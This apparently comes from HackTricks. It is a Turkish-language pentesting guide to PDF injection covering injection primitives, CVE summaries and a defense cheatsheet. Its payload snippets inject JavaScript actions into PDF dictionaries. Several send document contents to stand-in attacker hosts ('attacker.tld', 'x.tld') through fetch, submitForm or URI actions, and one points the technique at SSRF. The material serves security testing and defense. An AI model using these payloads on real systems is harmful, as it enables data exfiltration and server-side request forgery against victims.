# PDF Injection

{{#include ../../banners/hacktricks-training.md}}

**Eğer girdiniz bir PDF dosyası içinde yansıtılıyorsa, JavaScript çalıştırmak, SSRF gerçekleştirmek veya PDF içeriğini çalmak için PDF verisi enjekte etmeyi deneyebilirsiniz.**
PDF sözdizimi son derece hoşgörülüdür – girdinizi gömen string veya dictionary'den çıkabiliyorsanız Acrobat/Chrome'un memnuniyetle parse edeceği tamamen yeni objeler (veya aynı objede yeni anahtarlar) ekleyebilirsiniz.
2024'ten bu yana bir dizi bug-bounty raporu, *bir adet kaçışsız parantez veya ters eğik çizgi* 'nin tam script yürütme için yeterli olduğunu gösterdi.

## TL;DR – Modern Attack Workflow (2024-2026)
1. Oluşturulan PDF'te bir **(parenthesis string)**, `/URI ( … )` veya `/JS ( … )` alanı içinde biten kullanıcı kontrollü herhangi bir değer bulun.
2. Sintaksın geçerli kalması için `) ` ile (string'i kapatıp) aşağıdaki primitiflerden biri ile devam edin ve ardından tekrar bir açılış parantezi koyarak bitirin.
3. Zararlı PDF'i bir kurbana teslim edin (veya dosyayı otomatik olarak render eden bir backend servisine gönderin – blind bugs için ideal).
4. Payload'ınız PDF görüntüleyicide çalışır:
* Chrome / Edge → PDFium Sandbox
* Firefox → PDF.js (see CVE-2024-4367)
* Acrobat → Full JavaScript API (can exfiltrate arbitrary file contents with `this.getPageNthWord`)

Example (annotation link hijack):
```pdf
(https://victim.internal/) ) /A << /S /JavaScript /JS (app.alert("PDF pwned")) >> /Next (
```
*İlk `)` orijinal URI string'ini kapatır, sonra kullanıcı linke tıkladığında Acrobat'ın çalıştıracağı yeni bir **Action** sözlüğü ekleriz.*

## Kullanışlı Injection Primitives
| Hedef | Payload Snippet | Notlar |
|------|-----------------|-------|
| **Açılışta JavaScript** | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | Belge açıldığında anında çalışır (Acrobat'ta çalışır, Chrome'da çalışmaz). |
| **Link'e tıklandığında JavaScript** | `/A << /S /JavaScript /JS (fetch('https://attacker.tld/?c='+this.getPageNumWords(0))) >>` | Bir `/Link` annotation'ını kontrol ediyorsanız PDFium & Acrobat'ta çalışır. |
| **Blind data exfiltration** | `<< /Type /Action /S /URI /URI (https://attacker.tld/?leak=)` | JS içinde `this.getPageNthWord` ile birleştirerek içeriği çalın. |
| **Server-Side SSRF** | Same as above but target an internal URL – great when the PDF is rendered by back-office services that honour `/URI`. | Yukarıdakinin aynısı fakat hedef iç ağ URL'si — PDF, `/URI`'yi kabul eden back-office servisleri tarafından render edildiğinde çok etkilidir. |
| **Additional Actions (/AA)** | `/AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>` | Açılış/odaklanma sırasında çalışması için Page/Annotation/Form sözlüğüne ekleyin. |
| **Yeni objeler için satır sonu** | `\nendobj\n10 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj` | Kütüphane yeni satır karakterleri enjekte etmenize izin veriyorsa tamamen yeni objeler oluşturabilirsiniz. |

## Embedded Actions as Injection Targets
PDF görüntüleyicileri, bir belge açıldığında veya belirli bir olay tetiklendiğinde çalışabilecek `/OpenAction` ve `/AA` (Additional Actions) gibi **gömülü actions**'ı birinci sınıf özellikler olarak ele alır. Eğer action kabul eden herhangi bir sözlüğe (Catalog, Page, Annotation veya Form field) enjekte edebiliyorsanız, bir `/AA` ağacı ekleyebilir ve açılış/odaklanma sırasında JavaScript'i tetikleyebilirsiniz.

Örnek payload for **generator-side object injection** (orijinal string/sözlüğü kapatıp `/AA` enjekte edin):
```pdf
) >> /AA << /O << /S /JavaScript /JS (app.alert('AA fired')) >> >> (
```
Bu desen, son zamanlardaki jsPDF sorunlarıyla eşleşir; `addJS`'e (veya belirli AcroForm alanlarına) geçirilen saldırgan kontrollü girdi, amaçlanan JavaScript string'inden çıkarak bir **Additional Action** dictionary'si enjekte eder.

## Blind Enumeration Trick
Gareth Heyes (PortSwigger) bilinmeyen bir doküman içindeki her objeyi listeleyen tek satırlık bir komut yayınladı – üretilen PDF'i göremediğinizde kullanışlı:
```pdf
) /JS (for(i in this){try{this.submitForm('https://x.tld?'+i+'='+this[i])}catch(e){}}) /S /JavaScript /A << >> (
```
Kod, Acrobat DOM üzerinde yineleme yapar ve her property/value çifti için dışa istekler yapar; bu size dosyanın *JSON-ish* bir dökümünü verir.
Tam teknik için white-paper “Portable Data **ex**Filtration”a bakın.

## Gerçek Dünya Hataları (2023-2026)
* **CVE-2026-25755** – jsPDF `addJS` PDF object injection: saldırgan kontrollü stringler JS literalini kapatıp `/AA` → `/O` → `/JavaScript` aksiyonları enjekte edebilir; bunlar açılma/odaklanma sırasında tetiklenir.
* **CVE-2024-4367** – Firefox’un PDF.js 4.2.67 öncesi sürümlerinde Arbitrary JavaScript execution, özenle hazırlanmış `/JavaScript` aksiyonu ile sandbox’ı atladı.
* **Bug bounty 2024-05** – Büyük bir fintech, müşteri tarafından sağlanan fatura notlarının `/URI` içine düşmesine izin verdi; `file:///` URI kullanılarak internal metadata host’a SSRF gösterildikten sonra rapora $10k ödendi.
* **CVE-2023-26155** – `node-qpdf`’de temizlenmemiş PDF yolu üzerinden command-injection, ters eğik çizgilerin ve parantezlerin PDF katmanından *önce* bile escape edilmesinin önemini gösterir.

## Savunma Cheatsheet
1. **Ham kullanıcı girdisini** `(`…`)` içindeki stringlere veya isimlere asla doğrudan birleştirmeyin. PDF spesifikasyonunun §7.3'ünde gerektiği gibi `\`, `(`, `)` karakterlerini escape edin veya hex stringler `<...>` kullanın.
2. Link oluşturuyorsanız, tam olarak URL-encode ettiğiniz `/URI (https://…)` tercih edin; istemci görüntüleyicilerde `javascript:` şemalarını engelleyin.
3. PDF’leri post-process ederken `/OpenAction`, `/AA` (additional actions), `/Launch`, `/SubmitForm` ve `/ImportData` sözlüklerini temizleyin veya doğrulayın.
4. Sunucu tarafında, JavaScript ve dış aksiyonları kaldıran bir headless converter (örn. qpdf –decrypt –linearize) ile güvensiz PDF’leri render edin.
5. PDF viewer’ları güncel tutun; PDF.js < 4.2.67 ve Acrobat Reader Temmuz 2024 öncesi yamalar kolay kod yürütülmesine izin veriyordu.
6. Client-side generator’lar (örn. jsPDF) kullanıyorsanız, güvensiz girdiyi `addJS`’e veya PDF action sözlüklerinin içine düşecek AcroForm setter’larına asla geçirmeyin.

## Referanslar
* Gareth Heyes, “Portable Data exFiltration – XSS for PDFs”, PortSwigger Research (güncellendi May 2024). <https://portswigger.net/research/portable-data-exfiltration>
* Dawid Ryłko, “CVE-2024-4367: Arbitrary JavaScript Execution in PDF.js” (Nis 2024). <https://dawid.dev/sec/cve-2024-4367-arbitrary-javascript-execution-in-pdf-js>
* GitLab Advisory Database, “CVE-2026-25755: jsPDF has a PDF Object Injection via Unsanitized Input in addJS Method” (Feb 2026). <https://advisories.gitlab.com/pkg/npm/jspdf/CVE-2026-25755/>
* Adobe Acrobat Help, “Acrobat shows a warning message when signing documents” (Sep 2025) – gömülü aksiyonlar like OpenAction/AA. <https://helpx.adobe.com/acrobat/kb/embedded-action-signing-warning.html>
{{#include ../../banners/hacktricks-training.md}}
